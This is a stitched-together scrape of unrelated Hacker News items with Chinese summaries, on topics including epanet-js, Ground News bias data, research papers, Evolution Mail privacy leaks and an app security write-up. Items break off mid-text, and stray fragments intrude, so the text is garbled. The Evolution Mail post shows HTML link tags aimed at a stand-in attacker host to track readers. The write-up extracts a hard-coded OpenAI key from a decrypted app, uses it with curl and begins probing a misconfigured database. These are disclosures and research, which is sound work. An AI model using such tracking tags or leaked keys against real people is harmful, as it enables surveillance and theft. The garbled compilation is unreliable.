• **文化差异的评论**：cab404的评论（"ne doljno!" 意为 "不应该！"）可能暗示了对项目开放性或定价的不同文化视角，但未提供具体理由。

• **对EPANET及其应用的认识**：iachilo表示首次了解到EPANET及其专用软件，认为这是新的知识，显示了对该领域软件需求的认识。

• **GIS系统的综合性**：jalk提出了市政使用GIS系统包含所有基础设施（如供水、电力、通信等）的疑问，探讨了这些系统是否缺乏模拟功能。

争议焦点：
• 商业软件高价和封闭性 vs 开源和低成本方案的优劣。
• epanet-js的FSL许可证模式的具体含义和影响。
• epanet-js的定价策略是否合理，以及如何平衡开源和商业利益。

44464628.article_content:
epanet-js
epanet-js
is a new web application that combines modern web maps with the industry-standard
EPANET
hydraulic simulation algorithm. It’s for people planning and updating water utility systems: connecting pipes and pressures and figuring out what will happen. It’s a problem area that I’m totally fascinated by and know very little about. It’s made by the folks from
Iterating
- Luke Butler and Sam Payá, who are experts in the field.
If you’ve been following along with my blog and projects, you might notice something familiar about this screenshot of epanet-js:
Yep! A lifetime ago, I built a company and product called
Placemark
, which was a tool for creating and editing map data. When the business part didn’t work out, I published a
free-to-use version of Placemark
and
made the code open source
. I chose a very permissive license for the code:
the MIT license
. I wanted to let
anything
happen, including -
especially
- people creating paid products with the code.
It’s hard to explain to people outside of the world of open source that folks building a business with the help of my code is
the dream
.
Partly it’s that ‘being helpful’ is one of the goals in life that never gets old. The other part is that
most software becomes obsolete and abandoned quickly
. Creating software with any legacy is rare and something to celebrate.
Plus, Placemark was a general purpose tool in search of a successful niche: I never figured out what that niche was. I had a lot of learning to do about product-market-fit. But hydraulic simulation is a real market, and these folks are real experts.
There are other markets like this, I’m sure, and using Placemark code as a base could be a good way to jumpstart those companies - it’s not perfect, as I’ve documented extensively, but it could be good as a first step.
And the folks at Iterating have even
contributed changes upstream to the open source Placemark
codebase, but that isn’t required by the MIT license at all: that’s just because they’re cool folks.
They’ve also
open sourced the core epanet-js library
, and released the web application
under the Functional Source License
, which
makes new code contributions open source after two years
.
</source>
And epanet-js is a tool that you can run in a browser - full simulations with a WASM-based engine. It’s competing with expensive old-school software that costs $16,000 a year, runs exclusively on Windows, is
priced by “pipes”
, and uses the same engine, EPANET. This is so much better in comparison. A radical improvement.
Congrats to Luke and Sam for creating
epanet-js
. It’s super cool. If you speak hydraulic simulation or know someone who does, try it out!
July 3, 2025
Tom MacWright
@macwright.com on Bluesky
,
@tmcw@mastodon.social on Mastodon

scoott.blog
Why I'm skeptical of Ground News
Scott Odle • Thursday, January 18, 2024
Ground News
↗
is a website and mobile app, aiming to “offer clarity in an increasingly chaotic media landscape”.
It collects articles from thousands of news sources across the political spectrum, and groups them into “stories,” showing how different media outlets cover the same event differently.
According to the About page, the site is managed by a team of 18 people in Waterloo, Ontario.
Ground News has recently begun to sponsor several creators on YouTube and other platforms.
These creators are often politically left-of-center, but many educational channels have also begun promoting the site.
How does Ground News work?
Each of Ground’s news sources is prominently labeled with Bias and Factuality ratings.
According to the
Methodology
↗
page, these ratings are sourced from numerous independent rating agencies.
Bias ratings span seven categories, from “Far Left” to “Center” to “Far Right”. Factuality ratings can be either “Low”, “Mixed”, or “High”.
Some sources are also categorized based on their ownership, which is researched independently by the Ground News team.
All of this data is used to deliver Ground News’ most prominent feature, Blindspot.
Blindspot highlights stories where coverage skews drastically towards one side or other of the political spectrum.
Blindspot stories aggregate all the available sources for an event, and present them beneath a unified title and summary.
For many larger stories, the summary is available from “Left”, “Center”, and “Right” perspectives, and a “Bias Insights” feature details the differences in coverage across difference perspectives.
For example,
this story
↗
discusses a lingering impact of 2021’s Hurricane Larry, which deposited a large amount of microplastic particles over Newfoundland.
This story is labeled as a Blindspot for the right, because 60% of its coverage comes from left-leaning sources.
It is unclear how Ground News aggregates these stories together, or how the title, summary, and Bias Insights are generated.
Based on the volume of stories that Ground handles each day, proportional to the size of their team, I came to the assumption that this is done using AI, or some other type of automated process.
This assumption is strengthened by the “Insights by Ground AI” banner that appears on most stories.
However, there is no confirmation that this is the case, nor any explanation of how the app actually works.
Looking for false balance on Ground News
False balance is a form of media bias, where well-established facts and research are presented alongside an “opposing point of view.”
The opposing viewpoint has less evidence to back it up, but gets presented with the same weight, giving the illusion that a story is neutral and unbiased.
Carlos Maza gave a
TEDxCUNY talk
↗
in 2019, where he explained false balance and its effects quite compellingly.
Conceptually, Ground’s Blindspot stories seem like a place where false balance and other biases would easily creep in.
After exploring their site for a bit, I have two questions:
Are Blindspot stories well-sourced, whether they’re left-leaning or right-leaning? If not, does one side lie more than the other?
Are there any examples of an outright lie being presented as a Blindspot for one side or the other?
To answer these questions, I used a Python script to retrieve 500 Blindspots from November and December of 2023.
264 of these stories were tagged as Blindspots for the left, meaning that their coverage skews towards the right.
The remaining 236 were presented as right-wing Blindspots, meaning that their coverage is mostly left-leaning.
Question 1: Factuality across the political divide
Overall source quality
First off, I counted the number of sources in each Blindspot story, grouped by their Factuality rating.
This chart shows the average quality and quantity of sources, for Blindspot stories on each side of the aisle.
Stories from both sides tend to have a similar number of sources (17.7 on average for left-leaning stories, and 16.4 for right-leaning ones).
However, the quality of sources varies drastically:
Left-leaning stories have far more high-factuality sources: 10.9 on average, compared to 2.7 for the right.
The majority of sources for right-leaning stories are rated as “mixed factuality”. Ground News points out that mixed-factuality sources might:
“not always use proper sourcing"
"use loaded language that alters the context of facts"
"fail to correct false or misleading information”
Low-factuality sources are nearly nonexistent on the left, with an average of 0.2 per story. The average right-leaning story uses 3 low-factuality sources.
High-quality sources
Drilling into the high-factuality sources specifically, we can see a clear difference.
Left-leaning stories tend to have a healthier number of high-factuality sources.
Every story has at least one, and most have five or ten (with a statistical mode of 5).

data.title: LookingGlass: Generative Anamorphoses via Laplacian Pyramid Warping
data.author: jw1224
data.article_summary: 《LookingGlass: Generative Anamorphoses via Laplacian Pyramid Warping》一文介绍了一种生成变形图像的新方法。传统的变形图像（Anamorphosis）只有在特定视角下才能显示其真实形态，而本文通过使用潜在校正流模型，提出了一种即使直接观看也能保持有效解释的变形图像生成技术。文中引入了拉普拉斯金字塔变形（Laplacian Pyramid Warping）方法，这是一种频谱感知的图像变形技术，有助于生成高质量的视觉效果。该方法将视觉谜题（Visual Anagrams）扩展到潜在空间模型，并支持更广泛的空间变换，从而创造出新颖的生成感知 illusion。

不同观点：

• **fudged71**：表达了对许多光学错觉通过新的生成技术重新被探索的喜爱。

44495154.article_content:
LookingGlass: Generative Anamorphoses via Laplacian Pyramid Warping
In this work, we revisit these famous optical illusions with a generative twist. With the help of latent rectified flow models, we propose a method to create anamorphic images that still retain a valid interpretation when viewed directly.
June 10, 2025
CVPR 2025
Authors
Pascal Chang (DisneyResearch|Studios/ETH Joint PhD)
Sergio Sancho (DisneyResearch|Studios/ETH Joint PhD)
Jingwei Tang (DisneyResearch|Studios)
Markus Gross (DisneyResearch|Studios)
Vinicius Azevedo (DisneyResearch|Studios)
LookingGlass: Generative Anamorphoses via Laplacian Pyramid Warping
Download Publication PDF
Download Supplemental PDF
Abstract
Anamorphosis refers to a category of images that are intentionally distorted, making them unrecognizable when viewed directly. Their true form only reveals itself when seen from a specific viewpoint, which can be through some catadioptric device like a mirror or a lens. While the construction of these mathematical devices can be traced back to as early as the 17th century, they are only interpretable when viewed from a specific vantage point and tend to lose meaning when seen normally. In this paper, we revisit these famous optical illusions with a generative twist. With the help of latent rectified flow models, we propose a method to create anamorphic images that still retain a valid interpretation when viewed directly. To this end, we introduce Laplacian Pyramid Warping, a frequency-aware image warping technique key to generating high-quality visuals. Our work extends Visual Anagrams to latent space models and to a wider range of spatial transforms, enabling the creation of novel generative perceptual illusions.

data.article_summary:
《AI Agent革命：AI代理掌控代码》一文介绍了AI代理在软件工具中的兴起，特别是在数据科学领域的应用。文章指出，尽管GitHub的Copilot、亚马逊的CodeWhisperer等工具越来越流行，但它们大多无法直接在笔记本内核中运行。MLJAR Studio填补了这一空白，它内置AI代理，可以在笔记本中像真实队友一样工作，编写和解释代码，帮助学习。

MLJAR Studio提供三种模式：
1. **数据分析师模式**：无需编码，AI代理通过数据完成分析和机器学习任务。
2. **代码助手模式**：用户用英语描述需求，AI代理生成Python代码。
3. **教师模式**：互动教学，通过选择题学习代码。

使用AI代理可以加快数据处理速度，帮助学习代码，并确保数据隐私和安全。MLJAR Studio实现了AI代理与笔记本的无缝集成，是数据科学工作的未来工具。

data.title: Thesis: Interesting work is less amenable to the use of AI
data.author: koch
data.article_summary: 文章作者Rob Koch提出了一个观点：有趣且有价值的工作相较于无趣的工作，更不容易被人工智能（AI）取代。他提到，虽然很多人称赞AI提高了生产力，但他认为如果将自己的工作完全交给大型语言模型（LLM），会失去上下文理解，并违背“专一做好一件事”的原则。Koch质疑那些经常编写样板代码（boilerplate）的软件工程师工作的价值，认为这样的工作不仅效率低下，而且容易被取代。他强调，软件工程师的核心应是解决问题，而非仅仅匹配样板代码。
data.comments_summary:
主要讨论点：LLM（大型语言模型）在工作中的实际应用价值、伦理问题以及对人类工作的影响

不同观点：
• overgard：认为LLM无法真正进行推理，其生成内容类似于“高级自动抄袭”，尤其在使用开源软件训练的情况下。他质疑LLM的伦理问题，因为无法像使用传统资源一样明确给予信用。同时，他认为LLM对重复性工作有用，但在创造性或独特性任务上作用有限。
• janaagaard：通过实际案例说明LLM生成内容需要大量的事实核查，即使明确提示它不要编造信息。他认为使用LLM的过程（如事实核查）可能是有趣的，但LLM本身不能替代人类创造性工作。
• keiferski：将AI工具视为扩展知识和创意的助手，而非直接生成最终产品的工具。他强调AI在研究和编辑中的价值，而不是写作本身，从而更加宽容其输出的错误。
• orochiмаaru：认为AI主要针对处理和管理大量已知知识，帮助处理常规任务，而非替代创新或原创思维。专家能够更有效地利用AI，而缺乏专业知识的人可能会被其误导。
• viccis：LLM在从零开始构建项目时非常有用，但在处理复杂、技术债务或跨团队决策时效果不佳。他指出，初创企业可能过度依赖LLM，忽略了技术审查和调整的必要性。
• ianbicking：认为AI可以在多种工作中发挥作用，尤其是通过辅助研究工具帮助理解背景和历史，从而使工作更加有趣和丰富。
• JimDabell：提出AI处理简单任务可以让人类专注于更困难的任务，从而使工作整体更有趣。
• jugg1es：AI促使他反思工作价值，重新审视自己的工作内容。
• simpaticoder：LLM无法进行真正的创新，它只能在已有的知识框架内运作。
• rorylaitila：LLM可以快速生成多种可能性，但最终的决策和价值判断仍需人类完成，类似于摄影师从大量照片中选择最佳作品。
• paulcole：批评使用“thesis”一词掩盖个人偏见，指出所谓“有趣的工作”往往是自我定义的，而非普遍认同的。
• briandw：LLM在进入不熟悉领域时提供了很好的入门指导，比低质量的文档更有帮助。
• aaronbrethorst：大多数项目中包含大量重复性工作，LLM可以帮助处理这些部分，使人类专注于有趣的业务逻辑或算法。
• qwertox：认为LLM可以作为增强版的Stack Overflow使用，但应遵循“专注做好一件事”的原则，避免过度依赖。

补充讨论：
• LLM的伦理问题，尤其是在生成内容的可信度和信用归属方面的争议。
• LLM在不同工作流程中的具体应用方式，如辅助研究、编辑、构建项目等。
• 专家与非专家在使用LLM时的体验差异，以及如何通过有效提示提高LLM的输出质量。
• LLM对工作性质的影响，尤其是对重复性任务和创造性任务的不同作用。
• 对LLM过度依赖可能导致的技术债务和跨团队协作问题。

Thesis: interesting work (i.e., work worth doing) is less amenable to the use of AI than ... non-interesting work.
I have to admit that I get a little FOMO when I see people on HN laude the use of AI and how much more productive it's making them. Meanwhile, I feel like if I tried to offload my work to an LLM, I would both lose context and be violating the do-one-thing-and-do-it-well principle I half-heartedly try to live by.
I don't mean to disparage anyone working on boilerplate, it's something we all have to do, but at the same time that's just not what I'm doing. Or at least, that's not what I'm spending most of my time on. Why would someone be writing boilerplate all the time? How is that not, even without LLMs, a failure of efficiency? Why would you think your boilerplate-writing job would be secure?
Have I been misunderstanding what a lot of software engineers do, or think they do? I thought we solved problems. I didn't think we just matched boilerplate to feature requests, merely the last worker in the assembly line of idea manifestation.
Cheers

data.author: PaulHoule
data.article_summary: 本文介绍了由Inception Labs等研究人员开发的基于扩散模型的新一代大型语言模型——Mercury。这些模型采用Transformer架构，能够并行预测多个词符，尤其在编码应用方面表现突出。Mercury Coder提供两种尺寸：Mini和Small，在NVIDIA H100 GPU上分别达到1109 tokens/秒和737 tokens/秒的吞吐量，速度比其他优化模型快高达10倍，同时保持相当的质量。该模型在Copilot Arena上也获得了开发者的实际验证，目前在速度上排名第一，质量上排名第二。研究团队还发布了一个公共API和免费试用平台。

• **[londons_explore]** 对LLM的可视化功能提出改进建议，希望展示真实的中间步骤。这表明用户对LLM可视化和透明度的需求。

Abstract:
We present Mercury, a new generation of commercial-scale large language models (LLMs) based on diffusion. These models are parameterized via the Transformer architecture and trained to predict multiple tokens in parallel. In this report, we detail Mercury Coder, our first set of diffusion LLMs designed for coding applications. Currently, Mercury Coder comes in two sizes: Mini and Small. These models set a new state-of-the-art on the speed-quality frontier. Based on independent evaluations conducted by Artificial Analysis, Mercury Coder Mini and Mercury Coder Small achieve state-of-the-art throughputs of 1109 tokens/sec and 737 tokens/sec, respectively, on NVIDIA H100 GPUs and outperform speed-optimized frontier models by up to 10x on average while maintaining comparable quality. We discuss additional results on a variety of code benchmarks spanning multiple languages and use-cases as well as real-world validation by developers on Copilot Arena, where the model currently ranks second on quality and is the fastest model overall. We also release a public API at

44489690.article_summary: 本文介绍了由Inception Labs等研究人员开发的基于扩散模型的新一代大型语言模型——Mercury。这些模型采用Transformer架构，能够并行预测多个词符，尤其在编码应用方面表现突出。Mercury Coder提供两种尺寸：Mini和Small，在NVIDIA H100 GPU上分别达到1109 tokens/秒和737 tokens/秒的吞吐量，速度比其他优化模型快高达10倍，同时保持相当的质量。该模型在Copilot Arena上也获得了开发者的实际验证，目前在速度上排名第一，质量上排名第二。研究团队还发布了一个公共API和免费试用平台。

data.title: Evolution Mail Users Easily Trackable
data.author: mike-cardwell
data.article_summary: Evolution Mail的“加载远程内容”隐私保护功能失效多年未修复。即使该选项关闭，含有特定HTML标签的邮件仍会触发DNS请求或建立连接，泄露用户是否阅读邮件及其大致位置。开发团队将问题归咎于WebKitGTK，且未有近期修复计划。作者建议，若重视隐私，应卸载Evolution Mail，因其无法保护用户隐私，且开发者不认为这是他们的责任。
data.comments_summary:
主要讨论点：HTML邮件及相关隐私、安全问题及其解决方案

不同观点：
• [akimbostrawman] 认为HTML邮件一直是个错误，暗示其设计存在根本问题。
• [aitacobell] 指出，不工作的隐私功能可能比没有隐私功能更糟糕，强调功能有效性的重要性。
• [dvdkon] 对WebKit漏洞报告的更新表示乐观，期待问题从根源上得到解决。
• [btown] 询问是否有优秀的HTML预处理器可以用于防御，特别是在无法控制网络环境的情况下，支持多层次防御策略。
• [NoahZuniga] 关心Thunderbird是否能防御这种跟踪方式。
• [kosolam] 指出Gmail也会通过其他方式（如AWS SES）泄露信息，即使图像加载被禁用。
• [ajross] 详细批评HTML邮件格式，认为其过于复杂且安全性差，导致电子邮件在日常使用中逐渐被聊天工具取代。
• [monster_truck] 纠正术语，指出现在使用“允许列表”而非“白名单”。
• [InvisGhost] 对开发者未能认真对待问题表示不满，认为Evolution需要进行公关以避免未来类似问题。
• [arp242] 认为通过DNS日志和SNI头进行跟踪虽然理论上可能，但实际上很少发生，认为这是一个相对较小的问题，且相关响应是合理的。

补充讨论：
• 讨论中涉及的具体技术解决方案包括HTML预处理、内容安全策略（CSP）、允许列表策略等。
• 争议焦点在于HTML邮件固有的复杂性和安全漏洞，以及这些漏洞在实际应用中的严重性。一些人认为这是根本性问题，需要彻底改变，而另一些人则认为这是可控的、相对较小的问题。
• 对开发者和软件项目团队的响应速度和处理方式也存在批评，认为需要更好的公关和问题解决机制。

44512684.article_content:
Evolution Mail Users Easily Trackable
Written an hour ago by Mike Cardwell
Evolution Mail’s “Load Remote Content” option, as a privacy protection feature doesn’t work. They know it doesn’t work. It hasn’t worked for years and there is no sign it will be fixed any time soon.
I discovered the other day that if a HTML email contains a tag like:
<link
rel
=
"dns-prefetch"
href
=
"https://trackingcode.attackersdomain.example.com"
>
Then when an email is opened in Evolution Mail, a DNS request for trackingcode.attackersdomain.example.com is performed. This happens with remote content disabled, and without clicking the button to fetch it. The sender can look at their DNS logs to see if you’ve read your email, and the IP address of your DNS resolver at that time, which may indicate your location.
I opened a
bug report
with Evolution Mail, and they blamed WebKitGTK for this situation and have closed my ticket as a
duplicate of another ticket
which was opened in April 2024. That ticket reported a different but similar bug:
<link
href
=
"trackingcode.attackersdomain.example.com"
rel
=
"preconnect"
>
This apparently triggers a connection when you read an email, even without clicking to load remote content. An attacker could look at the SNI header during the TLS negotiation to identify the unique reader of such an email, and it would grant them their IP address.
This one
links back to a webkit bug
which was opened in August 2023, which also suggests there will be other such leaks, and which shows no sign of being dealt with.
I suggested that maintaining a whitelist of allowed html tags and attributes, and stripping them before passing the email html onto a web browser would be a good defense in depth strategy, but this looks unlikely to be followed.
So my suggestion is: If you care about having privacy when reading your email, uninstall Evolution Mail. It doesn’t protect your privacy, and the devs don’t consider that to be their responsibility.

data.title: Archaeologists unveil 3,500-year-old city in Peru
data.author: neversaydie
data.article_summary: 考古学家在秘鲁北部巴兰卡省发现了一座距今3500年的古城佩尼科（Peñico），该城建于公元前1800至1500年之间，位于海拔600米的山坡上，距利马北部约200公里。佩尼科被认为是连接太平洋沿岸社区与安第斯山脉和亚马逊盆地居民的重要贸易枢纽。研究显示，该城有18座建筑，包括仪式庙宇和住宅建筑，出土文物包括仪式物品、陶土雕塑和贝壳项链。佩尼科靠近公元前3000年建立的卡拉尔文明，这一发现有助于理解卡拉尔文明在气候变化影响后的发展。考古学家Ruth Shady指出，佩尼科在贸易和文化交流中占据战略位置，是卡拉尔社会的延续。
data.comments_summary:
主要讨论点：关于Peñico古城是否为美洲最古老文明的争议及其考古发现的意义

不同观点：
• [tree_enjoyer的观点]  
Peñico被认为是一个有着3500年历史的城市，并作为连接太平洋沿岸社区与安第斯山脉和亚马逊盆地居民的重要贸易枢纽。然而，tree_enjoyer认为称其为“最古老文明”有些夸张。虽然Peñico有早期存留的建筑结构，但越来越多的证据表明人类在更早的时间就已经在美洲活动。tree_enjoyer强调，在奥尔梅克文明之前可能已经存在其他文明，只是尚未发现或不如后来的文明那样广为人知。

• [adolph的观点]  
adolph对Peñico的最新研究发现表示怀疑，质疑是否有新的实质性成果。他指出，研究人员Shady和Machacuay在Google Scholar上没有新的相关出版物。adolph还提到，经过八年的研究，该遗址挖掘出了18个结构，包括仪式庙宇和住宅建筑群，但未见有新的重大发现被报道。

补充讨论：
• 争议的焦点在于Peñico是否可以被称为“美洲最古老文明”的代表，以及近期是否有新的考古发现被忽视或未被充分报道。tree_enjoyer强调了考古学上的未知领域和可能的早期人类活动，而adolph则关注现有研究成果的实际证据和新颖性。

• 另一个值得注意的点是关于考古发现的传播和学术发表的透明度问题，adolph特别提到了研究人员在Google Scholar上缺乏新的出版物，这可能意味着对Peñico的最新研究尚未得到充分的学术认可或传播。

44487451.article_content:
Image source,
Reuters
Jessica Rawnsley
BBC News
Published
6 July 2025
Archaeologists have announced the discovery of an ancient city in Peru's northern Barranca province.
The 3,500-year-old city, named PeÃ±ico, is believed to have served as a key trading hub connecting early Pacific coast communities with those living in the Andes mountains and Amazon basin.
Located some 200km north of Lima, the site lies about 600 metres (1,970 feet) above sea level and is thought to have been founded between 1,800 and 1,500 BC - around the same time that early civilisations were flourishing in the Middle East and Asia.
Researchers say the discovery sheds light on what became of the Americas' oldest civilisation, the Caral.
Image source,
Reuters
Image caption,
An aerial view of the archaeological zone of PeÃ±ico, in Peru, an ancient city established 3,500 years ago
Drone footage released by researchers shows a circular structure on a hillside terrace at the city's centre, surrounded by the remains of stone and mud buildings.
Eight years of research at the site unearthed 18 structures, including ceremonial temples and residential complexes.
In buildings at the site, researchers discovered ceremonial objects, clay sculptures of human and animal figures and necklaces made from beads and seashells.
PeÃ±ico is situated close to where Caral, recognised as the oldest known civilisation in the Americas, was established 5,000 years ago at around 3,000 BC in the Supe valley of Peru.
Caral features 32 monuments, including large pyramid structures, sophisticated irrigation agriculture and urban settlements. It is believed to have developed in isolation to other comparative early civilisations in India, Egypt, Sumeria and China.
Dr Ruth Shady, the archaeologist who led the recent research into PeÃ±ico and the excavation of Caral in the 1990s, said that the discovery was important for understanding what became of the Caral civilisation after it was decimated by climate change.
The PeÃ±ico community was "situated in a strategic location for trade, for exchange with societies from the coast, the highlands and the jungle", Dr Shady told the Reuters news agency.
At a news conference unveiling the findings on Thursday, archaeologist Marco Machacuay, a researcher with the Ministry of Culture, said that PeÃ±ico's significance lies in it being a continuation of the Caral society.
Peru is home to many of the Americas' most significant archaeological discoveries, including the Inca citadel of Machu Picchu in the Andes and the mysterious Nazca Lines etched into the desert along the central coast.

data.title: Show HN: FlopperZiro – A DIY open-source Flipper Zero clone
data.author: iraton
data.article_summary: FlopperZiro是一个开源、低成本、可自行DIY的Flipper Zero克隆项目，使用Arduino IDE进行编程。项目硬件包括STM32微控制器、RF收发模块、PN532/PN7150 RFID/NFC模块、OLED显示屏、红外收发器等组件。它支持RubberDucky、RFID/NFC、IR、RF等功能，可通过SD卡保存/加载数据，并显示电池及存储剩余百分比。软件方面仍在开发中，包括解决SD卡和显示问题、完善菜单及功能。项目提供3D打印外壳设计，硬件PCB也在持续改进。FlopperZiro是一个趣味项目，不具备专业设备的功能。
data.comments_summary:
主要讨论点：关于不同设备（包括Flipper Zero及其替代品如Capibara Zero）的功能、软件支持、外观设计以及实际应用的讨论。

不同观点：
• [Chihuahua0633] 认为Flipper Zero的流行很大程度上归功于其强大的社区支持，并质疑其他替代设备是否具有相同的软件支持水平。
• [forgetbook] 主要关注Flipper Zero的隐私问题，特别是其是否会“自动回传数据”（phoning home），这在设备的用例中是一个重要的隐私顾虑。
• [aitacobell] 以幽默的方式提出外观设计的问题，询问新设备是否像Tamagotchi（电子宠物），暗示了对设备外观和用户体验的关注。
• [conradev] 讨论了设备的便携性，提出是否可以将现代智能手机的电力用于驱动此类设备，认为Flipper Zero虽然好用但体积过大且需要充电。
• [Neywiny] 从技术角度分析了新设备与Flipper Zero的区别，指出新设备在RF（射频）能力上的局限性，认为其功能较为简化，仅限于433 MHz的信号重放攻击。
• [zeroq] 强调了Flipper Zero的文化吸引力，指出其以较低的价格（200美元）提供了一种“炫酷”的体验，能够吸引公众和媒体的关注。

补充讨论：
• [karolist] 提供了Capibara Zero的网站链接，补充了关于Capibara Zero的信息，供其他讨论者参考。
• [anfractuosity] 提到了Flipper Zero的山寨版在Aliexpress上的存在，质疑是否有人见过这些克隆产品，暗示了对设备质量和来源的担忧。

争议焦点：
• Flipper Zero的软件支持和社区支持是否优于其他替代设备（如Capibara Zero）。
• 新设备在功能和便携性上是否能与Flipper Zero媲美，特别是在RF能力和外观设计方面。
• Flipper Zero的隐私问题，尤其是“phoning home”的可能性，是否会影响用户对设备的选择。

总结来看，讨论主要围绕设备的功能、支持、隐私和外观展开，参与者从不同角度表达了对这些设备的看法和关注点。

data.article_summary: 本文讲述了作者在一次大学黑客松中获得第二名，并对一个名为Mentora的AI导师项目产生兴趣。在探索其技术细节后，作者发现该项目使用了React Native、Supabase和OpenAI，但未能成功推出。之后，作者关注了同一开发者的新项目Pandu，这是一个涉及AI的社交媒体应用。作者通过解密其IPA文件，发现该应用将OpenAI的API密钥硬编码在客户端，导致安全风险。此外，应用使用Supabase作为后端服务，但由于配置不当，用户可以直接读写数据库，存在严重安全隐患。作者通过分析代码，揭示了开发中的多个问题，并指出这种开发方式极易导致安全漏洞。

"JUST FUCKING SHIP IT" (or: on vibecoding)
07/09/25
because some people simply shouldn't be allowed to use the internet
Preface
I have minimal experience with exploitation or security research- some techniques employed in this write-up are almost certainly suboptimal. This is not a tutorial, do not treat it as such. Sensitive information has been censored as best as possible.
Introduction
Earlier in the year I attended a hackathon organized by my university's IEEE branch. My team and I managed to hack together a pretty decent submission, and for our efforts, we were rewarded with
second place
. Among the submissions, a one
Mentora
piqued my interest. Mentora marketed itself as an "AI tutor", seeking to gamify quizzes and provide personalized lesson plans using, you guessed it, large language models.
Interested, I began to explore the "How we built it" section of the Devpost. React Native, Supabase, and OpenAI integration. Yup! This
reeks
of vibe coder slop. Unfortunately, Mentora never seemed to see the light of day. Luckily,
our hero
didn't stop there, and this time he's breaking into the social media market. Enter:
Pandu
.
What even is Pandu?
Much like Mentora, Pandu is a pretty generic take on an existing genre
but with more AI slop
. Disappointingly, there is yet to be an Android release of Pandu, and given that I don't own any Apple devices, investigating this might be a little rough.
First Steps
Apparently, Apple's
IPA
format is encrypted, meaning that blindly pulling files from a server and expecting to be able to read them isn't going to work. Luckily, someone has managed to automate this process of decrypting these bundles and has even been so kind as to expose the tooling behind a Telegram bot.
After acquiring the decrypted IPA, I simply suffixed the file with
.zip
and extracted it:
unzip
pandu_ipa_v103.ipa.zip
The archive yielded a
Payload/
folder, with the following structure:
The main file of interest here is the
main.jsbundle
, which appears to be a JavaScript bundle compiled with Hermes. After a quick pass with
hermes-dec
, I was left with a mostly readable blob of pseudocode:
python
hbc_decompiler.py ./Payload/Pandu.app/main.jsbundle pandu_decomp.js
Initial Investigation
I began my search by looking for very low-hanging fruit. Surely an app published on the App Store wouldn't expose an OpenAI key, right?
grep
"
'sk-
"
pandu_decomp.js
r11 = 'sk-proj-*************************************************';
WHAT? There. Is. No. Way.
curl
"
https://api.openai.com/v1/responses
"
\
-
H
"
Content-Type: application/json
"
\
-
H
"
Authorization: Bearer sk-proj-********
"
\
-
s
\
-
d
'
{
"model": "gpt-4.1",
"input": "Write me a haiku about why it is not a great idea to hard-code OpenAI API keys into client-facing applications."
}
'
|
jq
-
r
'
.output[0].content[0].text
'
Secrets in plain sight—
Exposed keys invite misuse,
Guard doors, don’t paint signs.
So it turns out that all the fancy LLM integration is handled client-side, with the users' device issuing the OpenAI API queries and forwarding the output to the "backend" (if you can even call it that, I'll get to this later).
Now that we know that LLM queries are handled client-side, it shouldn't be too difficult to pull out the system prompt.
An LLM prompt isn't exactly "valuable information," and "prompt engineering" is most definitely not a skill- Nonetheless I'm expecting this to be quite funny.
"You are a Gen Z App, You are Pandu,you are helping a user spark conversations with a new user, you are not cringe and you are not too forward, be human-like. You generate 1 short, trendy, and fun conversation starter. It should be under 100 characters and should not be unfinished. It should be tailored to the user's vibe or profile info. Keep it casual or playful and really gen z use slangs and emojis. No Quotation mark"
I wonder what prompted him to tell the model not to be cringe.
Supabase
If you aren't familiar, Supabase is a
Backend-as-a-Service
, providing CRUD-accessible endpoints, a database, storage buckets, authentication, and even real-time communication. The upside of something like this is that you don't need to understand the complexities that come with backend development in order to build something that "just works". However, you'll later come to see that this is also a hidden downside, as some people shouldn't be permitted within 10 feet of a backend.
Taking the place of a standard database, Supabase expects the client to talk directly to the database- now, you might be thinking to yourself: "isn't that a horrible idea?" and to your question, I'll reply "yes." The assumption is that the person in charge of configuring Supabase will correctly dish out permissions such that end-users cannot simply read/write to arbitrary relations, but as you'll soon see, this is not always the case.
With the decompiled pseudocode in hand, it was as simple as grepping for a few keywords:
function
(
...
)
{
...
r1
=

  - 对使用“mate/wire side”代替传统的“male/female”术语表示困惑，并询问这是否是欧洲的习惯用法。

补充讨论：
- [gia_ferrari] 更关注工具的背景信息和用户数据处理问题，表明用户对工具的长期使用和可持续性有疑虑。
- [all2] 则主要从工具的功能性和实用性角度出发，关心工具是否能够灵活适应不同用户的需求。
- [dylan604] 则关注工具中使用术语的地区差异，表明可能存在地域性术语习惯的差异。

争议焦点：目前没有直接的争议，但[dylan604]对术语的困惑表明工具在不同地区的用户可能存在理解上的差异。

data.title: Galiliean-invariant cosmological hydrodynamical simulations on a moving mesh
data.author: gone35
data.article_summary: 本文介绍了一种新的宇宙学流体动力学模拟方法，基于移动非结构化网格（Voronoi网格），解决了传统方法如SPH和AMR在处理流体不稳定性、伽利略不变性和过度混合方面的不足。该方法采用有限体积法和二阶Godunov方案，具备自动调整空间分辨率的能力，兼具SPH和Eulerian方法的优点。新方法在处理冲击波和接触不连续性方面表现优异，并通过AREPO代码实现了2D和3D的并行计算。文章还讨论了自引力处理和网格自适应细化技术，展示了新方法在多个测试问题上的高精度表现，证明其在宇宙学模拟中具有竞争优势。

• [antognini] 指出该论文是2009年的，并提供了相关代码的链接，表明代码在约十年后发布。这强调了该技术的后续发展和可获取性。
• [jauntywundrkind] 对论文中的技术细节进行了描述，特别是关于移动无结构网格和Voronoi镶嵌的使用。他们认为这种方法比以前的固定网格更能适应问题的变化，并对视觉示例表示赞赏。
• [curt15] 提出在大神经网络热潮下，传统的HPC（高性能计算）是否仍然具有生命力的问题，暗示了对当前技术趋势的质疑。

44490848.article_content:
Paper
arXiv:0901.4107
E pur si muove:
Galiliean-invariant cosmological hydrodynamical simulations on a moving
mesh
Authors:
Volker
Springel
(MPA)
Comments:
accepted in
MNRAS, 67 pages, 50 figures.
Hydrodynamic cosmological simulations at present usually employ either
the Lagrangian smoothed particle hydrodynamics (SPH) technique, or
Eulerian hydrodynamics on a Cartesian mesh with (optional) adaptive
mesh refinement (AMR).  Both of these methods have
disadvantages
that negatively impact their accuracy in certain situations,
for
example the suppression of fluid instabilities in the case of SPH, and
the lack of Galilean-invariance and the presence of overmixing in the
case of AMR.  We here propose a novel scheme which largely
eliminates these weaknesses. It is based on a moving unstructured mesh
defined by the Voronoi tessellation of a set of discrete points. The
mesh is used to solve the hyperbolic conservation laws of ideal
hydrodynamics with a finite volume approach, based on a second-order
unsplit Godunov scheme with an exact Riemann solver. The
mesh-generating points can in principle be moved arbitrarily. If they
are chosen to be stationary, the scheme is equivalent to an ordinary
Eulerian method with second order accuracy. If they instead move with
the velocity of the local flow, one obtains a Lagrangian formulation of
continuum hydrodynamics that does not suffer from the mesh distortion
limitations inherent in other mesh-based Lagrangian schemes. In this
